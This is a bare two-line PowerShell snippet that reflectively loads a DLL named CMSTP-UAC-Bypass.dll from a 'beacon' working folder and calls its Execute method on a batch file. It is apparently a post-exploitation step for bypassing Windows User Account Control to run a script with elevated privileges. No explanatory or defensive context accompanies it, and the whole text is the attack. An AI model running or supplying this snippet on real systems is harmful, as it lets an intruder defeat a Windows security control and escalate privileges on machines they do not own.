[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\temp\beacon\elevate\CMSTP-UAC-Bypass.dll")) | Out-Null

[CMSTPBypass]::Execute("${pwd}\elevate\batch.bat")